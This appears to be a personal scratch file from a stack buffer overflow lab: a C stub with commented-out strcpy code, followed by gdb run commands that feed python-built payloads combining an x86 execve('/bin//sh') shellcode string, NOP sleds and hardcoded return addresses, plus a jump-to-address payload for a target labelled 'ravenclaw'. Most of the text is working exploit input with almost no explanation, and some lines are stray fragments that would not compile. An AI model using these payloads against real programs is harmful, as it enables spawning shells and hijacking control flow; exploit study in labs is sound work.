#include<stdio.h>
#include<string.h>

void getdata(char** str) 
{
	//int a = 10;
	//int b = 20;
	//short c = 30;
	// char buffer[100];
	// strcpy(buffer, str);
	// puts(buffer);
}

int main(int argc, char** argv) 
{
	getdata(argv[1]);
	return 0;
}

// Print 100 A's in Python
// python -c 'print("A"*100)'

// To find the buffer
// Place break at push eax
// fill the buffer
// run $(python -c 'print("A"*100)')
// print /x $eax

//run $(python -c 'print("\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x99\x52\x53\x89\xe1\xb0\x0b\xcd\x80" + "\x90"*76 + "\x90"*4 + "\x48\xef\xff\xbf")')

// Shellcode 
// "\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x99\x52\x53\x89\xe1\xb0\x0b\xcd\x80" 


0xbfffeeff

run $(python -c 'print("\x90"*125 + "\x90"*4 + "\x28\xee\xff\xbf")')

// ravenclaw
0x080484cb

printf("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xcb\x84\x04\x08");

run $(python -c 'print("\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x99\x52\x53\x89\xe1\xb0\x0b\xcd\x80" + "\x90"*488 + "\x90"*4 + "\x28\xee\xff\xbf")')
